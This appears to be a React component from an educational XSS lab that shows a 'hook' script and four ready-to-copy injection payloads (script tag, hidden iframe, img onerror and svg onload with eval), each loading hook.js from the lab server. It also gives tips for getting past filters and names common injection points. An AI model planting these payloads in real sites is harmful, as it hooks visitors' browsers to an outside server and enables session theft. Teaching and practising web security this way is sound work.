import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { getBaseUrl, generateHookCode } from "@/lib/utils";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";

interface HookJsModalProps {
  onClose: () => void;
}

const HookJsModal = ({ onClose }: HookJsModalProps) => {
  const [hookCode, setHookCode] = useState("");
  const [selectedTab, setSelectedTab] = useState("full-code");
  const { toast } = useToast();
  const baseUrl = getBaseUrl();
  
  // Get hook code from API
  const hookCodeQuery = useQuery({
    queryKey: ['/api/hookjs'],
    onSuccess: (data) => {
      if (data.code) {
        setHookCode(data.code);
      } else {
        setHookCode(generateHookCode(baseUrl));
      }
    },
    onError: () => {
      setHookCode(generateHookCode(baseUrl));
    }
  });
  
  // Generate the different injection methods
  const hookScriptPath = `${baseUrl}/hook.js`;
  const scriptTagInjection = `<script src="${hookScriptPath}"></script>`;
  const iframeInjection = `<iframe src="javascript:document.write('<script src=${hookScriptPath}></script>')" style="display:none"></iframe>`;
  const imgOnErrorInjection = `<img src="x" onerror="javascript:eval('var s=document.createElement(\\'script\\');s.src=\\'${hookScriptPath}\\';document.body.appendChild(s);')">`;
  const svgInjection = `<svg onload="javascript:eval('var s=document.createElement(\\'script\\');s.src=\\'${hookScriptPath}\\';document.body.appendChild(s);')"></svg>`;
  
  // Copy code to clipboard
  const copyCode = (code: string) => {
    navigator.clipboard.writeText(code)
      .then(() => {
        toast({
          title: "Copied to clipboard",
          description: "The hook code has been copied to your clipboard",
          variant: "default",
        });
      })
      .catch((err) => {
        console.error("Failed to copy: ", err);
        toast({
          title: "Failed to copy",
          description: "Please try again or select and copy manually",
          variant: "destructive",
        });
      });
  };
  
  return (
    <Dialog open={true} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-3xl">
        <DialogHeader>
          <DialogTitle>JavaScript Hook Code</DialogTitle>
          <DialogDescription>
            This is an example of the JavaScript hook code used in this educational lab. Copy and inject this code into a vulnerable page to establish a connection to the XSS lab server.
          </DialogDescription>
        </DialogHeader>
        
        <Tabs defaultValue="full-code" onValueChange={setSelectedTab} value={selectedTab}>
          <TabsList className="grid grid-cols-5">
            <TabsTrigger value="full-code">Full Code</TabsTrigger>
            <TabsTrigger value="script-tag">Script Tag</TabsTrigger>
            <TabsTrigger value="iframe">Iframe</TabsTrigger>
            <TabsTrigger value="img-tag">Img Tag</TabsTrigger>
            <TabsTrigger value="svg-tag">SVG Tag</TabsTrigger>
          </TabsList>
          
          <TabsContent value="full-code">
            <div className="p-4 bg-neutral-100 dark:bg-neutral-900 rounded-md overflow-auto max-h-[400px]">
              <pre className="text-sm font-mono text-neutral-800 dark:text-neutral-200 whitespace-pre-wrap">
                {hookCodeQuery.isLoading 
                  ? "Loading hook code..." 
                  : hookCode}
              </pre>
            </div>
            <p className="text-sm text-neutral-600 dark:text-neutral-400 mt-2">
              The complete hook code for educational understanding. This is useful when you need to understand how the hook works or modify it.
            </p>
          </TabsContent>
          
          <TabsContent value="script-tag">
            <div className="p-4 bg-neutral-100 dark:bg-neutral-900 rounded-md overflow-auto">
              <pre className="text-sm font-mono text-neutral-800 dark:text-neutral-200 whitespace-pre-wrap">
                {scriptTagInjection}
              </pre>
            </div>
            <p className="text-sm text-neutral-600 dark:text-neutral-400 mt-2">
              The simplest XSS method using a script tag. This works in most cases where HTML injection is possible.
            </p>
            <div className="bg-blue-50 dark:bg-blue-900/30 border-l-4 border-blue-400 p-3 mt-2 text-sm">
              <strong>Common injection points:</strong> User comments, profile fields, search results, URL parameters
            </div>
          </TabsContent>
          
          <TabsContent value="iframe">
            <div className="p-4 bg-neutral-100 dark:bg-neutral-900 rounded-md overflow-auto">
              <pre className="text-sm font-mono text-neutral-800 dark:text-neutral-200 whitespace-pre-wrap">
                {iframeInjection}
              </pre>
            </div>
            <p className="text-sm text-neutral-600 dark:text-neutral-400 mt-2">
              Uses a hidden iframe that loads the hook code. This technique can sometimes bypass basic XSS filters that block script tags.
            </p>
            <div className="bg-blue-50 dark:bg-blue-900/30 border-l-4 border-blue-400 p-3 mt-2 text-sm">
              <strong>When to use:</strong> When direct script tags are blocked but iframes are allowed
            </div>
          </TabsContent>
          
          <TabsContent value="img-tag">
            <div className="p-4 bg-neutral-100 dark:bg-neutral-900 rounded-md overflow-auto">
              <pre className="text-sm font-mono text-neutral-800 dark:text-neutral-200 whitespace-pre-wrap">
                {imgOnErrorInjection}
              </pre>
            </div>
            <p className="text-sm text-neutral-600 dark:text-neutral-400 mt-2">
              Uses an image tag with an onerror event handler. When the image fails to load, it executes the JavaScript.
            </p>
            <div className="bg-blue-50 dark:bg-blue-900/30 border-l-4 border-blue-400 p-3 mt-2 text-sm">
              <strong>When to use:</strong> When script and iframe tags are blocked but img tags with event handlers are allowed
            </div>
          </TabsContent>
          
          <TabsContent value="svg-tag">
            <div className="p-4 bg-neutral-100 dark:bg-neutral-900 rounded-md overflow-auto">
              <pre className="text-sm font-mono text-neutral-800 dark:text-neutral-200 whitespace-pre-wrap">
                {svgInjection}
              </pre>
            </div>
            <p className="text-sm text-neutral-600 dark:text-neutral-400 mt-2">
              Uses an SVG tag with an onload event handler. This method can be useful when other tags are filtered.
            </p>
            <div className="bg-blue-50 dark:bg-blue-900/30 border-l-4 border-blue-400 p-3 mt-2 text-sm">
              <strong>When to use:</strong> When other tags are filtered but SVG tags with event handlers are allowed
            </div>
          </TabsContent>
        </Tabs>
        
        <div className="bg-yellow-50 dark:bg-yellow-900/30 border-l-4 border-yellow-400 p-4 mt-4">
          <div className="flex">
            <div className="flex-shrink-0">
              <span className="material-icons text-yellow-400">warning</span>
            </div>
            <div className="ml-3">
              <h3 className="text-sm font-medium text-yellow-800 dark:text-yellow-400">Educational Use Disclaimer</h3>
              <div className="mt-2 text-sm text-yellow-700 dark:text-yellow-300">
                <p>This code is provided for educational purposes only. Using this code against websites or systems without explicit permission is illegal and unethical. Always practice responsible security research.</p>
              </div>
            </div>
          </div>
        </div>
        
        <DialogFooter>
          <Button variant="outline" onClick={onClose}>Close</Button>
          <Button onClick={() => {
            const codeMap = {
              'full-code': hookCode,
              'script-tag': scriptTagInjection,
              'iframe': iframeInjection,
              'img-tag': imgOnErrorInjection,
              'svg-tag': svgInjection
            };
            copyCode(codeMap[selectedTab as keyof typeof codeMap]);
          }}>
            Copy Code
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
};

export default HookJsModal;
